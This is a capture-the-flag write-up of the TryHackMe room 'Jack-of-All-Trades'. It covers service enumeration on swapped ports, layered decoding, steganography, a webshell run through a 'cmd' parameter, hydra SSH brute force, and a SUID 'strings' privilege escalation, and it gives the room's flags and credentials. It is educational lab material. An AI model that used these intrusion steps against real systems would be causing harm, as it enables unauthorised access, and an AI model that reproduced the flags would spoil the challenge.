# Jack-of-All-Trades — TryHackMe Writeup

**Author:** Artem  
**Platform:** TryHackMe  
**Room:** Jack-of-All-Trades  
**Difficulty:** Easy  
**Tags:** steganography, multi-layer encoding, swapped ports, SUID, webshell  

---

## Overview

A boot2root machine originally developed for Securi-Tay 2020. The key gimmick: HTTP and SSH services are running on **swapped ports**. The box requires multi-layer decoding, steganography extraction, and exploiting a SUID binary for privilege escalation.

**Flags:**
- User: `securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}`
- Root: `securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}`

---

## Enumeration

### Nmap

```bash
nmap -sC -sV -O 10.65.134.142
```

```
PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
```

**Key observation:** Ports are swapped — Apache on 22, SSH on 80. This is not a scan error; the admin intentionally reconfigured services. Always read the SERVICE column, not just the port number.

### Gobuster — First Attempt (Failed)

```bash
gobuster dir -u http://10.65.134.142 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,bak,zip,js
```

```
Error: unable to connect to http://10.65.134.142/: malformed HTTP status code "Debian-5"
```

**Mistake:** Default port 80 is SSH, not HTTP. Gobuster connected to SSH and received the SSH banner instead of an HTTP response.

**Fix:** Specify port 22 explicitly.

### Gobuster — Corrected

```bash
gobuster dir -u http://10.65.134.142:22 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,bak,zip,js
```

```
/index.html           (Status: 200) [Size: 1605]
/assets               (Status: 301) [Size: 318]
/recovery.php         (Status: 200) [Size: 943]
```

---

## Web Enumeration (Port 22)

### Firefox Port Restriction

Browsers block connections to port 22 (restricted port list). To access in Firefox:

1. Navigate to `about:config`
2. Create a **new String** parameter: `network.security.ports.banned.override`
3. Set value to `22`

**Note:** The parameter type must be **String**, not Boolean. Creating it as Boolean will only show true/false options.

### index.html — Hidden Comments

Source code reveals three images and two HTML comments:

```html
<img id="header" src="assets/header.jpg" width=100%>
<!-- Note to self - If I ever get locked out I can get back in at /recovery.php! -->
<!-- UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== -->
```

Images on the page:
1. `assets/header.jpg` — easy to miss, it's the page banner
2. `assets/stego.jpg` — dinosaur model (name hints at steganography)
3. `assets/jackinthebox.jpg` — toy

**Decoding the Base64 comment:**

```bash
echo "UmVtZW1iZXIgdG8gd2lzaC..." | base64 -d
```

```
Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq
```

**Result:** Password `u?WtKSraq` — this turns out to be the steghide passphrase.

### recovery.php — Three-Layer Encoding

The page contains a login form and an HTML comment with encoded data:

```
GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3D...
```

**Layer 1 — Base32** (uppercase A-Z, digits 2-7, ends with `=`):

```bash
echo "GQ2TOMRXME3TEN3B..." | base32 -d
```

Output: `45727a727a6f72652067756e67206775722070657271...`

**Layer 2 — Hex** (only characters 0-9, a-f in pairs):

```bash
echo "45727a727a6f726520..." | xxd -r -p
```

Output: `Erzrzore gung gur perqragvnyf gb gur erpbirel ybtva...`

**Layer 3 — ROT13** (text looks like English but all letters are shifted):

```bash
echo "Erzrzore gung gur..." | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

Output: `Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S`

### Encoding Recognition Cheat Sheet

| Encoding | Character Set | Telltale Signs |
|----------|--------------|----------------|
| Base64   | A-Z, a-z, 0-9, +, / | Mixed case, ends with `=` or `==` |
| Base32   | A-Z, 2-7 | Uppercase only, ends with `=` |
| Hex      | 0-9, a-f | Lowercase, character pairs, no letters past `f` |
| ROT13    | A-Z, a-z | Looks like English but isn't, preserves spacing/punctuation |

### The bit.ly Rabbit Hole

The link `bit.ly/2TvYQ2S` leads to a Wikipedia article. This is a **deliberate red herring** — it wastes time and provides no useful information for the exploit chain. Lesson: if a lead goes nowhere, backtrack to what you already have.

---

## Steganography

### steghide on stego.jpg — Decoy

```bash
steghide extract -sf stego.jpg -p "u?WtKSraq"
```

```
wrote extracted data to "creds.txt"
```

```
Hehe. Gotcha!
You're on the right path, but wrong image!
```

**Mistake:** The filename `stego.jpg` is bait. The message confirms the method (steghide) and passphrase are correct, but the target image is wrong.

### steghide on header.jpg — Correct Target

The third image `header.jpg` (page banner) is easy to overlook. Three images existed on the page, not two.

```bash
wget http://10.65.134.142:22/assets/header.jpg
steghide extract -sf header.jpg -p "u?WtKSraq"
```

```
wrote extracted data to "cms.creds"
```

```
Here you go Jack. Good thing you thought ahead!
Username: jackinthebox
Password: TplFxiSHjY
```

---

## Exploitation

### recovery.php — Webshell

Logging in to `/recovery.php` with `jackinthebox:TplFxiSHjY` reveals:

```
GET me a 'cmd' and I'll run it for you Future-Jack.
```

This is a webshell accessed via GET parameter:

```
http://10.65.134.142:22/nnxhweOV/index.php?cmd=whoami
```

Output: `www-data`

### Enumerating via Webshell

```
?cmd=ls /home
```

Found user `jack` with a password list:

```
?cmd=cat /home/jacks_password_list
```

### SSH Brute Force

Saved the password list and ran hydra against SSH on port 80:

```bash
hydra -l jack -P passwords.txt ssh://10.65.134.142:80
```

```
[80][ssh] host: 10.65.134.142   login: jack   password: ITMJpGGIqg1jn?>@
```

### SSH Access

```bash
ssh jack@10.65.134.142 -p 80
```

---

## Post-Exploitation

### User Flag

```bash
ls -la ~
```

```
-rwxr-x--- 1 jack jack 293302 Feb 28  2020 user.jpg
```

Flag is embedded in `user.jpg`. Extracted via `scp -P 80` and viewed — flag visible on the image:

```
securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}
```

### Privilege Escalation

**sudo:** Not available for jack.

**Group membership:**

```bash
id
```

```
uid=1000(jack) gid=1000(jack) groups=1000(jack),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),115(bluetooth),1001(dev)
```

The non-standard group `dev` stands out.

**Files owned by group dev:**

```bash
find / -group dev 2>/dev/null
```

```
/usr/bin/strings
/usr/bin/find
```

**Checking permissions:**

```bash
ls -la /usr/bin/strings
```

```
-rwsr-x--- 1 root dev 27536 Feb 25  2015 /usr/bin/strings
```

`strings` has the **SUID bit** set (`s` in owner execute position) and is owned by root. Since jack is in the `dev` group, he can execute it, and it runs as root.

**Initial wrong assumption:** I first thought `find` might have SUID for a `-exec /bin/sh` privesc, but `find` had normal permissions (`-rwxr-x---`, no SUID). The actual vector was `strings` — SUID lets it read any file on the system as root.

### Root Flag

```bash
strings /root/root.txt
```

```
ToDo:
1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
2.Make T-Rex model!
3.Meet up with Johny for a pint or two
4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
5.Remember to finish that contract for Lisa.
6.Delete this: securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}
```

---

## Lessons Learned

1. **Always read nmap SERVICE, not port numbers.** Ports are conventions, not rules. Services can run on any port.
2. **Recognize encoding by character set:** Base32 (A-Z, 2-7), Base64 (mixed case, 0-9, +/), Hex (0-9, a-f), ROT13 (English-like gibberish).
3. **Count all assets on a page.** I initially found only 2 images (stego.jpg, jackinthebox.jpg) and missed header.jpg in the `<img>` tag at the top.
4. **Decoys are part of CTF design.** Both stego.jpg and the bit.ly link were deliberate time-wasters. When something returns "wrong path" or leads to Wikipedia, backtrack.
5. **SUID on uncommon binaries is a goldmine.** Standard SUID audit: `find / -perm -4000 2>/dev/null`. Check every result with `ls -la`. Non-standard binaries like `strings` with SUID are almost always the intended privesc vector.
6. **`xxd -r -p`** converts a raw hex string back to bytes. `-r` = reverse, `-p` = plain (no address/offset formatting).
7. **Firefox blocks restricted ports.** Override via `about:config` → String parameter `network.security.ports.banned.override` = `22`.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Service enumeration |
| gobuster | Directory brute-forcing |
| curl | Manual HTTP requests |
| base32, base64 | Decoding |
| xxd | Hex-to-text conversion |
| tr (ROT13) | Caesar cipher decoding |
| steghide | JPEG steganography extraction |
| hydra | SSH password brute-force |
| strings (SUID) | Reading root-owned files |

---

## Attack Path Summary

```
Nmap (swapped ports) → Gobuster on :22 → recovery.php + index.html
    → Base64 comment → steghide password
    → Base32 → Hex → ROT13 → rabbit hole (bit.ly)
    → steghide on header.jpg → CMS credentials
    → Login → webshell → password list
    → Hydra SSH :80 → jack shell
    → SUID strings → root flag
```
